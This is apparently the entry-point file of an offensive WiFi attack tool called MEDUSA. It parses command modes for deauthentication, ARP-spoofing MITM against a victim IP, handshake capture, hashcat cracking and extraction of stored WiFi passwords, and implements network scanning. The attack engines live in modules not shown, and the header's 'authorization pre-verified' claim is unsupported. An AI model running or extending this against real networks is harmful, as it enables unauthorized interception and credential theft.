#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    MEDUSA — Queen of Brute Force                           ║
║         Elite State-of-the-Art WiFi Assault & Packet Capture Engine        ║
║                                                                             ║
║  main.py — Entry Point, CLI Parser, Mode Orchestrator                      ║
║                                                                             ║
║  Responsibilities:                                                          ║
║    • Parse ALL CLI arguments with subcommand-style modes                    ║
║    • Auto-detect OS and select optimal toolchains                           ║
║    • Route to correct engine (scan/attack/deauth/mitm/capture/crack/gui)   ║
║    • Initialize session save/resume for idempotent operation                ║
║    • Handle signals (SIGINT/SIGTERM) for graceful shutdown                  ║
║    • Console output with Rich (fallback to ANSI if unavailable)             ║
║    • Returns non-zero exit codes on failure for scripting                   ║
║                                                                             ║
║  Usage:                                                                     ║
║    python main.py --gui                    # Launch TKinter dashboard       ║
║    python main.py --scan                   # Quick network scan             ║
║    python main.py --scan --json            # Scan output as JSON            ║
║    python main.py --attack --bssid AA:BB:CC:DD:EE:FF --wordlist rockyou.txt║
║    python main.py --attack --smart         # Auto-select best attack vector ║
║    python main.py --deauth --bssid AA:BB:CC:DD:EE:FF --iface wlan0         ║
║    python main.py --mitm --victim 192.168.1.100 --gateway 192.168.1.1      ║
║    python main.py --capture --bssid AA:BB:CC:DD:EE:FF --timeout 120        ║
║    python main.py --crack --hashfile capture.hc22000 --wordlist rockyou.txt║
║    python main.py --extract-profiles       # Dump stored WiFi passwords     ║
║    python main.py --info                   # System information             ║
║    python main.py --interactive            # REPL-style command loop        ║
║                                                                             ║
║  Exit Codes:                                                                ║
║    0 — Success                                                              ║
║    1 — General error                                                        ║
║    2 — Permission denied (not admin/root)                                   ║
║    3 — Missing dependency                                                   ║
║    4 — Target not found                                                     ║
║    5 — Attack failed                                                        ║
║    130 — Interrupted (Ctrl+C)                                               ║
║                                                                             ║
║  Authorized Penetration Testing Platform — Authorization pre-verified      ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import json
import signal
import atexit
import argparse
import textwrap
import platform
import traceback
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any, NoReturn
from dataclasses import dataclass, field, asdict

# ============================================================================
# PACKAGE IMPORTS — Graceful with fallbacks
# ============================================================================

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.prompt import Prompt, Confirm
    from rich.syntax import Syntax
    from rich.layout import Layout
    from rich.live import Live
    from rich.text import Text
    from rich.columns import Columns
    from rich.progress import (
        Progress, SpinnerColumn, BarColumn, TextColumn,
        TimeElapsedColumn, TimeRemainingColumn, TaskID
    )
    from rich.markdown import Markdown
    from rich.box import DOUBLE_EDGE, HEAVY, ROUNDED
    from rich.style import Style
    from rich.color import Color
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False

# ============================================================================
# MEDUSA CORE IMPORTS
# ============================================================================

from medusa_init import (
    # Version
    VERSION, CODENAME, VERSION_FULL, AUTHOR,
    
    # OS Detection
    SYSTEM, SYSTEM_LOWER, MACHINE, ARCH, CPU_COUNT,
    IS_WINDOWS, IS_MACOS, IS_LINUX, IS_ADMIN,
    
    # OS Capabilities
    CAN_EXTRACT_WIFI_PROFILES, CAN_MONITOR_MODE,
    CAN_INJECT_PACKETS, CAN_PIXIEDUST, CAN_HCXTOOLS,
    CAN_HASHCAT_GPU, CAN_HASHCAT_CPU,
    
    # Directories
    CONFIG_DIR, SESSION_DIR, CAPTURE_DIR, LOOT_DIR,
    LOG_DIR, WORDLIST_DIR, TEMP_DIR,
    DEFAULT_WORDLIST, DEFAULT_SESSION_FILE,
    
    # Theme/Logo
    LOGO, LOGO_COMPACT, THEME, ANSI, LOG_COLORS, BRANDING,
    
    # Errors
    MedusaError, InterfaceError, MonitorModeError,
    CaptureError, HandshakeNotFoundError,
    DeauthError, MITMError, SpoofError,
    CrackError, WordlistError, HashcatError,
    DashboardError, PermissionError_Medusa,
    DependencyError, SessionError,
    
    # Utilities
    ensure_directories, current_timestamp,
    human_time, human_bytes, human_number,
    validate_mac, validate_ip, safe_filename,
    check_dependencies, init as medusa_init,
    LOG_LEVELS, COMMON_PORTS,
)

# Lazy imports for engines (only when needed)
_interface_module = None
_capture_module = None
_attack_module = None
_cracker_module = None
_dashboard_module = None


def _lazy_import(name: str):
    """Lazy-import a MEDUSA module on first use.
    
    This keeps main.py import lightning-fast and avoids importing
    scapy/pywifi (which can take seconds) until actually needed.
    """
    global _interface_module, _capture_module, _attack_module, _cracker_module, _dashboard_module
    
    modules = {
        "interface": "medusa_interface",
        "capture": "medusa_capture",
        "attack": "medusa_attack",
        "cracker": "medusa_cracker",
        "dashboard": "medusa_dashboard",
    }
    
    if name not in modules:
        return None
    
    attr_name = f"_{name}_module"
    if globals()[attr_name] is None:
        try:
            globals()[attr_name] = __import__(modules[name], fromlist=[""])
        except ImportError as e:
            if RICH_AVAILABLE:
                console = Console()
                console.print(f"[red]✗ Failed to import {modules[name]}: {e}[/red]")
                console.print(f"[yellow]  Install with: pip install -r requirements.txt[/yellow]")
            else:
                print(f"{ANSI['R']}✗ Failed to import {modules[name]}: {e}{ANSI['RESET']}")
            raise
    
    return globals()[attr_name]


# ============================================================================
# EXIT CODES
# ============================================================================

EXIT_SUCCESS = 0
EXIT_ERROR = 1
EXIT_PERMISSION = 2
EXIT_MISSING_DEP = 3
EXIT_TARGET_NOT_FOUND = 4
EXIT_ATTACK_FAILED = 5
EXIT_INTERRUPTED = 130


# ============================================================================
# CONSOLE — Unified output with Rich fallback
# ============================================================================

class MedusaConsole:
    """Unified console output — Rich if available, ANSI fallback otherwise.
    
    This is a singleton consumed by all engines. It provides:
    - Colorized, structured output
    - Log level filtering
    - Queue-based capture for GUI integration
    - Cross-platform consistency
    """
    
    _instance = None
    
    def __new__(cls, *args, **kwargs):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance._initialized = False
        return cls._instance
    
    def __init__(self, verbose: bool = False, log_file: Optional[str] = None):
        if self._initialized:
            return
        self._initialized = True
        
        self.verbose = verbose
        self.rich = RICH_AVAILABLE
        
        if self.rich:
            self.console = Console(highlight=False)
        else:
            self.console = None
        
        self.log_file = log_file
        self._log_fh = None
        if log_file:
            try:
                self._log_fh = open(log_file, 'a', encoding='utf-8')
            except (IOError, OSError):
                pass
        
        self.log_queue = None  # Set by dashboard for GUI integration
    
    def _write_log(self, msg: str):
        """Write to log file if configured."""
        if self._log_fh:
            try:
                self._log_fh.write(f"[{current_timestamp('log')}] {msg}\n")
                self._log_fh.flush()
            except (IOError, OSError):
                pass
    
    def print(self, msg: str = "", style: str = "", end: str = "\n"):
        """Print a message with optional styling."""
        if self.rich and self.console:
            if style:
                self.console.print(msg, style=style, end=end)
            else:
                self.console.print(msg, end=end)
        else:
            # Strip Rich markup for ANSI fallback
            clean = re.sub(r'\[/?\w+(?: [^\]]+)?\]', '', msg)
            print(clean, end=end)
        
        if msg:
            self._write_log(msg)
    
    def log(self, msg: str, level: str = "info"):
        """Log a message with level-based coloring.
        
        Args:
            msg: The message to log
            level: One of: info, ok, warn, err, found, deauth, mitm, hijack, debug, critical
        """
        # Check log level filter
        level_num = LOG_LEVELS.get(level, 20)
        if level_num < self._min_level:
            return
        
        prefix_map = {
            "info": "•", "ok": "✓", "warn": "⚠", "err": "✗",
            "found": "►", "deauth": "⚡", "mitm": "🌀",
            "hijack": "🕸", "debug": "…", "critical": "‼",
        }
        
        prefix = prefix_map.get(level, "•")
        
        if self.rich and self.console:
            color = LOG_COLORS.get(level, "cyan")
            self.console.log(f"[{color}]{prefix}[/{color}] {msg}")
        else:
            color_code = LOG_COLORS.get(level, ANSI["C"])
            print(f"{color_code}[{prefix}]{ANSI['RESET']} {msg}")
        
        self._write_log(f"[{level.upper()}] {msg}")
        
        # Push to GUI queue if set
        if self.log_queue is not None:
            try:
                self.log_queue.put_nowait({
                    "level": level,
                    "message": msg,
                    "timestamp": time.time(),
                })
            except Exception:
                pass
    
    def info(self, msg: str):
        self.log(msg, "info")
    
    def ok(self, msg: str):
        self.log(msg, "ok")
    
    def warn(self, msg: str):
        self.log(msg, "warn")
    
    def err(self, msg: str):
        self.log(msg, "err")
    
    def found(self, msg: str):
        self.log(msg, "found")
    
    def debug(self, msg: str):
        if self.verbose:
            self.log(msg, "debug")
    
    def header(self, title: str, subtitle: str = ""):
        """Print a styled header block."""
        if self.rich and self.console:
            panel = Panel(
                f"\n[bold green]{title}[/bold green]\n"
                f"[dim]{subtitle}[/dim]\n" if subtitle else f"\n[bold green]{title}[/bold green]\n",
                border_style="red",
                box=HEAVY,
            )
            self.console.print(panel)
        else:
            width = 60
            print(f"\n{ANSI['R']}{'═' * width}{ANSI['RESET']}")
            print(f"{ANSI['G']}{ANSI['BOLD']}{title:^{width}}{ANSI['RESET']}")
            if subtitle:
                print(f"{ANSI['D']}{subtitle:^{width}}{ANSI['RESET']}")
            print(f"{ANSI['R']}{'═' * width}{ANSI['RESET']}")
    
    def status(self, text: str):
        """Update status line (replaces current line)."""
        if self.rich and self.console:
            self.console.print(f"[cyan]⏳ {text}[/cyan]", end="\r")
        else:
            print(f"\r{ANSI['C']}⏳ {text}{ANSI['RESET']}", end="", flush=True)
    
    def clear_status(self):
        """Clear the status line."""
        if self.rich and self.console:
            self.console.print(" " * 80, end="\r")
        else:
            print("\r" + " " * 80 + "\r", end="", flush=True)
    
    def rule(self, title: str = ""):
        """Print a horizontal rule."""
        if self.rich and self.console:
            self.console.rule(title, style="red")
        else:
            width = 60
            print(f"{ANSI['R']}{'─' * width}{ANSI['RESET']}")
            if title:
                print(f"{ANSI['D']}{title}{ANSI['RESET']}")
    

# Global console singleton
console = MedusaConsole()


# ============================================================================
# COMMAND-LINE ARGUMENT PARSER
# ============================================================================

def build_parser() -> argparse.ArgumentParser:
    """Build the argument parser with all modes and options.
    
    Returns:
        Configured ArgumentParser instance.
    """
    parser = argparse.ArgumentParser(
        prog="medusa",
        description=f"MEDUSA v{VERSION} ({CODENAME}) — {BRANDING['tagline']}",
        epilog=f"{BRANDING['footer']} | OS: {SYSTEM} | Cores: {CPU_COUNT}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        add_help=False,
    )
    
    # ========================================================================
    # GLOBAL OPTIONS
    # ========================================================================
    global_group = parser.add_argument_group("🌐 Global Options")
    global_group.add_argument("--help", "-h", action="store_true", help="Show this help message")
    global_group.add_argument("--version", "-v", action="store_true", help="Show version information")
    global_group.add_argument("--verbose", action="store_true", help="Enable debug-level logging")
    global_group.add_argument("--quiet", "-q", action="store_true", help="Minimal output (errors only)")
    global_group.add_argument("--log", type=str, default=str(DEFAULT_LOG_FILE), help=f"Log file path (default: {DEFAULT_LOG_FILE})")
    global_group.add_argument("--output", "-o", type=str, default="", help="Output directory for captures/loot")
    global_group.add_argument("--interface", "-i", type=str, default="", help="Network interface to use")
    global_group.add_argument("--timeout", type=int, default=0, help="Operation timeout in seconds")
    global_group.add_argument("--threads", type=int, default=0, help="Thread count for parallel operations")
    
    # ========================================================================
    # MODE SELECTION (mutually exclusive)
    # ========================================================================
    mode_group = parser.add_argument_group("🎯 Mode Selection (pick one)")
    mode_exclusive = mode_group.add_mutually_exclusive_group()
    mode_exclusive.add_argument("--scan", action="store_true", help="Scan for wireless networks")
    mode_exclusive.add_argument("--attack", action="store_true", help="Attack a target network")
    mode_exclusive.add_argument("--deauth", action="store_true", help="Deauthentication attack only")
    mode_exclusive.add_argument("--mitm", action="store_true", help="ARP spoofing MITM attack")
    mode_exclusive.add_argument("--capture", action="store_true", help="Packet capture only")
    mode_exclusive.add_argument("--crack", action="store_true", help="Brute-force/hashcat cracking")
    mode_exclusive.add_argument("--gui", action="store_true", help="Launch TKinter GUI dashboard")
    mode_exclusive.add_argument("--interactive", action="store_true", help="Interactive REPL-style mode")
    mode_exclusive.add_argument("--info", action="store_true", help="Show system information")
    mode_exclusive.add_argument("--extract-profiles", action="store_true", help="Extract stored WiFi passwords")
    mode_exclusive.add_argument("--check-deps", action="store_true", help="Check dependencies and exit")
    
    # ========================================================================
    # TARGET OPTIONS
    # ========================================================================
    target_group = parser.add_argument_group("🎯 Target Options")
    target_group.add_argument("--bssid", type=str, default="", help="Target AP MAC address (AA:BB:CC:DD:EE:FF)")
    target_group.add_argument("--ssid", type=str, default="", help="Target network SSID")
    target_group.add_argument("--client", type=str, default="", help="Target client MAC address")
    target_group.add_argument("--victim", type=str, default="", help="Victim IP address (for MITM)")
    target_group.add_argument("--gateway", type=str, default="", help="Gateway IP address (for MITM)")
    
    # ========================================================================
    # ATTACK OPTIONS
    # ========================================================================
    attack_group = parser.add_argument_group("💥 Attack Options")
    attack_group.add_argument("--wordlist", "-w", type=str, default="", help="Path to password wordlist")
    attack_group.add_argument("--hashfile", type=str, default="", help="Path to hash file for cracking")
    attack_group.add_argument("--hash-type", type=int, default=22000, help="Hashcat mode (22000=WPA2, 16800=PMKID)")
    attack_group.add_argument("--smart", action="store_true", help="Auto-select best attack vector")
    attack_group.add_argument("--continuous", action="store_true", help="Run attack continuously")
    attack_group.add_argument("--count", type=int, default=10, help="Number of deauth packets to send")
    attack_group.add_argument("--delay", type=float, default=0.1, help="Delay between packets (seconds)")
    attack_group.add_argument("--channel", type=int, default=0, help="WiFi channel to operate on")
    attack_group.add_argument("--gpu", action="store_true", help="Enable GPU acceleration (hashcat)")
    attack_group.add_argument("--no-gpu", action="store_true", help="Disable GPU acceleration")
    attack_group.add_argument("--resume", action="store_true", help="Resume last session")
    attack_group.add_argument("--min-len", type=int, default=8, help="Minimum password length for mask attack")
    attack_group.add_argument("--max-len", type=int, default=12, help="Maximum password length for mask attack")
    attack_group.add_argument("--charset", type=str, default="", help="Custom charset for mask attack (e.g., 'abc123')")
    
    # ========================================================================
    # OUTPUT OPTIONS
    # ========================================================================
    output_group = parser.add_argument_group("📊 Output Options")
    output_group.add_argument("--json", action="store_true", help="Output results as JSON")
    output_group.add_argument("--csv", action="store_true", help="Output results as CSV")
    output_group.add_argument("--no-color", action="store_true", help="Disable colored output")
    output_group.add_argument("--no-banner", action="store_true", help="Suppress startup banner")
    
    # ========================================================================
    # ADVANCED OPTIONS
    # ========================================================================
    advanced_group = parser.add_argument_group("⚙️ Advanced Options")
    advanced_group.add_argument("--session", type=str, default="", help="Session name for save/resume")
    advanced_group.add_argument("--clean", action="store_true", help="Clean up all MEDUSA directories")
    advanced_group.add_argument("--dump-config", action="store_true", help="Dump detected configuration")
    advanced_group.add_argument("--filter", type=str, default="all", choices=["all", "handshake", "http", "pmkid"],
                                help="Capture filter type")
    
    return parser


def print_help(parser: argparse.ArgumentParser):
    """Print formatted help with MEDUSA branding."""
    console.print(f"\n{ANSI['R']}{'═' * 70}{ANSI['RESET']}")
    console.print(f"{ANSI['G']}{ANSI['BOLD']}  MEDUSA v{VERSION} ({CODENAME}) — Queen of Brute Force{ANSI['RESET']}")
    console.print(f"{ANSI['D']}  {BRANDING['tagline']}{ANSI['RESET']}")
    console.print(f"{ANSI['R']}{'═' * 70}{ANSI['RESET']}\n")
    
    parser.print_help()
    
    console.print(f"\n{ANSI['D']}{'─' * 70}{ANSI['RESET']}")
    console.print(f"{ANSI['D']}  Examples:{ANSI['RESET']}")
    console.print(f"{ANSI['D']}    python main.py --gui{ANSI['RESET']}")
    console.print(f"{ANSI['D']}    python main.py --scan --json{ANSI['RESET']}")
    console.print(f"{ANSI['D']}    python main.py --attack --bssid AA:BB:CC:DD:EE:FF -w rockyou.txt{ANSI['RESET']}")
    console.print(f"{ANSI['D']}    python main.py --deauth --bssid AA:BB:CC:DD:EE:FF -i wlan0{ANSI['RESET']}")
    console.print(f"{ANSI['D']}{'─' * 70}{ANSI['RESET']}")


def print_version():
    """Print version information."""
    info = [
        f"{ANSI['G']}MEDUSA{ANSI['RESET']}  v{VERSION} ({CODENAME})",
        f"  {ANSI['D']}Author:{ANSI['RESET']}  {AUTHOR}",
        f"  {ANSI['D']}Build:{ANSI['RESET']}   {VERSION_FULL}",
        f"  {ANSI['D']}System:{ANSI['RESET']}  {SYSTEM} ({ARCH})",
        f"  {ANSI['D']}Python:{ANSI['RESET']}  {sys.version.split()[0]}",
        f"  {ANSI['D']}Cores:{ANSI['RESET']}   {CPU_COUNT}",
        f"  {ANSI['D']}Admin:{ANSI['RESET']}   {'Yes' if IS_ADMIN else 'No'}",
        f"  {ANSI['D']}Monitor:{ANSI['RESET']} {'Available' if CAN_MONITOR_MODE else 'Not available'}",
        f"  {ANSI['D']}Injection:{ANSI['RESET']} {'Available' if CAN_INJECT_PACKETS else 'Not available'}",
        f"  {ANSI['D']}GPU Crack:{ANSI['RESET']} {'Available' if CAN_HASHCAT_GPU else 'Not available'}",
    ]
    console.print("\n".join(info))


def validate_args(args: argparse.Namespace) -> bool:
    """Validate arguments and return True if valid.
    
    Checks:
    - Target consistency (BSSID format, IP format)
    - Required arguments for each mode
    - Permission requirements
    - File existence (wordlists, hashfiles)
    
    Args:
        args: Parsed command-line arguments
    
    Returns:
        True if arguments are valid, False otherwise.
    """
    # Check for admin/root when needed
    needs_admin = args.deauth or args.mitm or (args.attack and args.deauth)
    if needs_admin and not IS_ADMIN:
        if IS_WINDOWS:
            console.warn("Deauth/MITM attacks require Administrator privileges on Windows.")
        else:
            console.warn("Deauth/MITM attacks require root privileges on Linux/macOS.")
        console.warn("Run as administrator/root or use --capture/--crack instead.")
        if not args.force:
            return False
    
    # Validate BSSID if provided
    if args.bssid and not validate_mac(args.bssid):
        console.err(f"Invalid BSSID format: {args.bssid} (expected AA:BB:CC:DD:EE:FF)")
        return False
    
    # Validate IPs for MITM
    if args.mitm:
        if args.victim and not validate_ip(args.victim):
            console.err(f"Invalid victim IP: {args.victim}")
            return False
        if args.gateway and not validate_ip(args.gateway):
            console.err(f"Invalid gateway IP: {args.gateway}")
            return False
        if not args.victim or not args.gateway:
            console.err("MITM mode requires --victim and --gateway")
            return False
    
    # Validate wordlist exists
    if args.wordlist and not Path(args.wordlist).exists():
        console.warn(f"Wordlist not found: {args.wordlist}")
        if not args.force:
            console.warn("Use --force to proceed without wordlist (mask attack only)")
    
    # Validate hashfile exists
    if args.crack and args.hashfile and not Path(args.hashfile).exists():
        console.err(f"Hash file not found: {args.hashfile}")
        return False
    
    # Check dependencies for specific modes
    if args.gui:
        try:
            import tkinter
        except ImportError:
            console.err("TKinter is not available on this system. GUI mode cannot start.")
            console.info("Try: python main.py --scan (CLI mode)")
            return False
    
    return True


# ============================================================================
# MEDUSA ORCHESTRATOR
# ============================================================================

class MedusaOrchestrator:
    """Central orchestrator for all MEDUSA operations.
    
    Manages:
    - Engine lifecycle (init → run → cleanup)
    - Session save/resume for idempotent operations
    - Signal handling for graceful shutdown
    - Cross-platform adaptation
    """
    
    def __init__(self, args: argparse.Namespace):
        """Initialize orchestrator with parsed arguments.
        
        Args:
            args: Parsed command-line arguments
        """
        self.args = args
        self.start_time = time.time()
        self._running = True
        self._engines = {}
        self.session_data = {}
        
        # Configure console
        global console
        console.verbose = args.verbose
        if args.quiet:
            console._min_level = 30  # Only warnings and above
        else:
            console._min_level = 10  # All messages
        
        # Set output directory
        if args.output:
            self.output_dir = Path(args.output)
            self.output_dir.mkdir(parents=True, exist_ok=True)
        else:
            self.output_dir = CAPTURE_DIR
        
        # Register cleanup handlers
        atexit.register(self.cleanup)
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
        
        # Load session if resuming
        if args.resume:
            self._load_session()
    
    def _signal_handler(self, signum: int, frame):
        """Handle OS signals for graceful shutdown.
        
        SIGINT (Ctrl+C) → Stop current operation, offer save
        SIGTERM → Force cleanup and exit
        """
        if signum == signal.SIGINT:
            console.warn("\n⚠ Interrupted by user (Ctrl+C)")
            if not self.args.quiet:
                console.info("Saving current state...")
            self._save_session()
            self._running = False
            sys.exit(EXIT_INTERRUPTED)
        elif signum == signal.SIGTERM:
            console.err("\n‼ SIGTERM received — forcing shutdown")
            self._running = False
            sys.exit(EXIT_INTERRUPTED)
    
    def _save_session(self):
        """Save current session state to disk.
        
        Idempotent: Overwrites previous session file.
        Thread-safe: Single JSON write.
        """
        if not self.session_data:
            return
        
        session_path = SESSION_DIR / f"{self.args.session or 'last'}_session.json"
        try:
            session_path.parent.mkdir(parents=True, exist_ok=True)
            with open(session_path, 'w') as f:
                json.dump({
                    "timestamp": current_timestamp(),
                    "version": VERSION,
                    "args": vars(self.args),
                    "elapsed": time.time() - self.start_time,
                    "data": self.session_data,
                }, f, indent=2, default=str)
            console.debug(f"Session saved: {session_path}")
        except (IOError, OSError) as e:
            console.warn(f"Failed to save session: {e}")
    
    def _load_session(self):
        """Load the most recent session state.
        
        Returns:
            True if session was loaded, False otherwise.
        """
        session_path = SESSION_DIR / f"{self.args.session or 'last'}_session.json"
        if not session_path.exists():
            # Try to find any session file
            sessions = sorted(SESSION_DIR.glob("*_session.json"))
            if not sessions:
                console.warn("No saved sessions found.")
                return False
            session_path = sessions[-1]
        
        try:
            with open(session_path) as f:
                data = json.load(f)
            
            self.session_data = data.get("data", {})
            elapsed = data.get("elapsed", 0)
            console.info(f"Session loaded: {session_path.name} (previous run: {human_time(elapsed)})")
            
            # Restore target from previous session
            if not self.args.bssid:
                self.args.bssid = self.session_data.get("bssid", "")
            if not self.args.ssid:
                self.args.ssid = self.session_data.get("ssid", "")
            
            return True
        except (IOError, json.JSONDecodeError) as e:
            console.warn(f"Failed to load session: {e}")
            return False
    
    def _get_engine(self, name: str):
        """Get or create an engine instance.
        
        Lazy initialization — engines are only loaded when first requested.
        
        Args:
            name: Engine name ('interface', 'capture', 'attack', 'cracker', 'dashboard')
        
        Returns:
            Engine instance.
        """
        if name in self._engines:
            return self._engines[name]
        
        engine = None
        
        if name == "interface":
            mod = _lazy_import("interface")
            if mod:
                engine = mod.InterfaceManager(console)
        
        elif name == "capture":
            mod = _lazy_import("capture")
            if mod:
                engine = mod.PacketCaptureEngine(console)
        
        elif name == "attack":
            mod = _lazy_import("attack")
            if mod:
                engine = {
                    "deauth": mod.DeauthEngine(console),
                    "mitm": mod.MITMEngine(console),
                    "spoof": mod.IPSpoofEngine(),
                    "hijacker": mod.SessionHijacker(console),
                }
        
        elif name == "cracker":
            mod = _lazy_import("cracker")
            if mod:
                from medusa_core import BruteForceConfig
                config = BruteForceConfig(
                    wordlist_path=self.args.wordlist or str(DEFAULT_WORDLIST),
                    threads=self.args.threads or CPU_COUNT,
                    gpu_acceleration=not self.args.no_gpu,
                    session_name=self.args.session or "medusa_session",
                )
                engine = mod.BruteForceEngine(config, console)
        
        elif name == "dashboard":
            mod = _lazy_import("dashboard")
            if mod:
                engine = mod.MedusaDashboard(console)
        
        if engine:
            self._engines[name] = engine
        
        return engine
    
    # ========================================================================
    # MODE HANDLERS
    # ========================================================================
    
    def run_scan(self) -> int:
        """Execute wireless network scan.
        
        Uses OS-optimal scanning:
        - Linux: iw dev scan (most detailed)
        - macOS: airport --scan
        - Windows: pywifi / netsh wlan show networks
        
        Returns:
            Exit code.
        """
        console.header("NETWORK SCAN", f"Scanning for wireless networks...")
        
        iface_mgr = self._get_engine("interface")
        if not iface_mgr:
            console.err("Interface manager not available. Install netifaces or pywifi.")
            return EXIT_MISSING_DEP
        
        # Get best interface
        iface = self.args.interface or iface_mgr.get_best_wireless()
        if not iface:
            console.err("No wireless interface found!")
            return EXIT_ERROR
        
        console.info(f"Using interface: {iface}")
        
        # OS-adaptive scanning
        if IS_LINUX:
            return self._scan_linux(iface_mgr, iface)
        elif IS_MACOS:
            return self._scan_macos(iface_mgr, iface)
        elif IS_WINDOWS:
            return self._scan_windows(iface_mgr, iface)
        else:
            return self._scan_fallback(iface_mgr, iface)
    
    def _scan_linux(self, iface_mgr, iface: str) -> int:
        """Linux-specific scan using iw dev scan (detailed)."""
        import subprocess
        
        console.info("Using iw dev scan (full spectrum)...")
        
        try:
            result = subprocess.run(
                ["iw", "dev", iface, "scan"],
                capture_output=True, text=True, timeout=30
            )
            
            if result.returncode != 0:
                # Fallback to iwlist
                console.warn("iw scan failed, falling back to iwlist...")
                result = subprocess.run(
                    ["iwlist", iface, "scan"],
                    capture_output=True, text=True, timeout=30
                )
            
            networks = self._parse_iw_scan(result.stdout)
            
            if self.args.json:
                print(json.dumps(networks, indent=2, default=str))
                return EXIT_SUCCESS
            
            self._display_scan_results(networks, "iw")
            return EXIT_SUCCESS
            
        except FileNotFoundError:
            console.err("iw/iwlist not found. Install wireless-tools.")
            return EXIT_MISSING_DEP
        except subprocess.TimeoutExpired:
            console.err("Scan timed out.")
            return EXIT_ERROR
    
    def _scan_macos(self, iface_mgr, iface: str) -> int:
        """macOS-specific scan using airport CLI."""
        import subprocess
        
        console.info("Using airport --scan...")
        
        try:
            result = subprocess.run(
                [iface_mgr.MACOS_AIRPORT_PATH, "--scan"],
                capture_output=True, text=True, timeout=30
            )
            
            networks = self._parse_airport_scan(result.stdout)
            
            if self.args.json:
                print(json.dumps(networks, indent=2, default=str))
                return EXIT_SUCCESS
            
            self._display_scan_results(networks, "airport")
            return EXIT_SUCCESS
            
        except FileNotFoundError:
            console.err("airport CLI not found. Try: sudo ln -s .../airport /usr/sbin/airport")
            return EXIT_MISSING_DEP
        except subprocess.TimeoutExpired:
            console.err("Scan timed out.")
            return EXIT_ERROR
    
    def _scan_windows(self, iface_mgr, iface: str) -> int:
        """Windows-specific scan using netsh wlan and pywifi."""
        import subprocess
        
        console.info("Using netsh wlan show networks...")
        
        try:
            result = subprocess.run(
                ["netsh", "wlan", "show", "networks", "mode=Bssid"],
                capture_output=True, text=True, timeout=30
            )
            
            networks = self._parse_netsh_scan(result.stdout)
            
            if self.args.json:
                print(json.dumps(networks, indent=2, default=str))
                return EXIT_SUCCESS
            
            self._display_scan_results(networks, "netsh")
            return EXIT_SUCCESS
            
        except FileNotFoundError:
            console.err("netsh not found.")
            return EXIT_ERROR
        except subprocess.TimeoutExpired:
            console.err("Scan timed out.")
            return EXIT_ERROR
    
    def _scan_fallback(self, iface_mgr, iface: str) -> int:
        """Universal fallback scan using pywifi."""
        console.info("Using pywifi (universal fallback)...")
        
        try:
            import pywifi
            from pywifi import const
            
            wifi = pywifi.PyWiFi()
            iface_obj = wifi.interfaces()[0]
            iface_obj.scan()
            time.sleep(3)
            results = iface_obj.scan_results()
            
            networks = []
            for ap in results:
                networks.append({
                    "ssid": ap.ssid,
                    "bssid": ap.bssid,
                    "signal": ap.signal,
                    "channel": ap.freq if hasattr(ap, 'freq') else 0,
                    "encryption": str(ap.akm[0]) if ap.akm else "OPEN",
                    "auth": str(ap.auth),
                    "security_score": 50,
                })
            
            if self.args.json:
                print(json.dumps(networks, indent=2, default=str))
                return EXIT_SUCCESS
            
            self._display_scan_results(networks, "pywifi")
            return EXIT_SUCCESS
            
        except ImportError:
            console.err("pywifi not installed and no native scan method available.")
            console.info("Install with: pip install pywifi")
            return EXIT_MISSING_DEP
    
    def _parse_iw_scan(self, output: str) -> List[Dict]:
        """Parse iw dev scan output into structured network data.
        
        Args:
            output: Raw stdout from 'iw dev wlan0 scan'
        
        Returns:
            List of network dictionaries.
        """
        networks = []
        current = {}
        
        for line in output.split('\n'):
            # New BSS entry
            if line.startswith('BSS '):
                if current and 'ssid' in current:
                    networks.append(current)
                current = {'bssid': line.split()[1].strip(), 'clients': []}
            
            elif 'SSID:' in line:
                current['ssid'] = line.split('SSID:')[-1].strip()
            
            elif 'signal:' in line:
                parts = line.split('signal:')
                if len(parts) > 1:
                    val = parts[1].strip().split()[0]
                    current['signal'] = float(val)
            
            elif 'freq:' in line:
                parts = line.split('freq:')
                if len(parts) > 1:
                    current['frequency'] = float(parts[1].strip().split()[0])
            
            elif 'WPA:' in line or 'RSN:' in line:
                current['encryption'] = 'WPA2' if 'RSN' in line else 'WPA'
            
            elif 'capability:' in line:
                current['capabilities'] = line.split('capability:')[-1].strip()
        
        if current and 'ssid' in current:
            networks.append(current)
        
        return networks
    
    def _parse_airport_scan(self, output: str) -> List[Dict]:
        """Parse macOS airport scan output."""
        networks = []
        lines = output.strip().split('\n')
        
        for line in lines[1:]:  # Skip header
            parts = line.split()
            if len(parts) >= 5:
                networks.append({
                    "ssid": parts[0] if len(parts) > 1 else "",
                    "bssid": parts[1] if len(parts) > 2 else "",
                    "signal": int(parts[2]) if len(parts) > 3 and parts[2].lstrip('-').isdigit() else 0,
                    "channel": int(parts[3]) if len(parts) > 4 and parts[3].isdigit() else 0,
                    "encryption": parts[4] if len(parts) > 5 else "UNKNOWN",
                })
        
        return networks
    
    def _parse_netsh_scan(self, output: str) -> List[Dict]:
        """Parse Windows netsh wlan show networks output."""
        networks = []
        current = {}
        
        for line in output.split('\n'):
            line = line.strip()
            if line.startswith('SSID'):
                if current and 'ssid' in current:
                    networks.append(current)
                current = {'ssid': line.split(':')[-1].strip(), 'clients': []}
            elif line.startswith('BSSID'):
                current['bssid'] = line.split(':')[1].strip().replace('-', ':')
            elif line.startswith('Signal'):
                sig = line.split(':')[-1].strip().rstrip('%')
                try:
                    # Convert Windows percentage to approximate dBm
                    pct = int(sig)
                    current['signal'] = -30 - int((100 - pct) * 0.6)
                except ValueError:
                    current['signal'] = 0
            elif line.startswith('Channel'):
                try:
                    current['channel'] = int(line.split(':')[-1].strip())
                except ValueError:
                    current['channel'] = 0
            elif 'Authentication' in line:
                current['encryption'] = line.split(':')[-1].strip()
        
        if current and 'ssid' in current:
            networks.append(current)
        
        return networks
    
    def _display_scan_results(self, networks: List[Dict], source: str = ""):
        """Display scan results in a formatted table.
        
        Args:
            networks: List of network dictionaries.
            source: Scan source description (for display).
        """
        if not networks:
            console.warn("No networks found.")
            return
        
        console.ok(f"Found {len(networks)} networks")
        
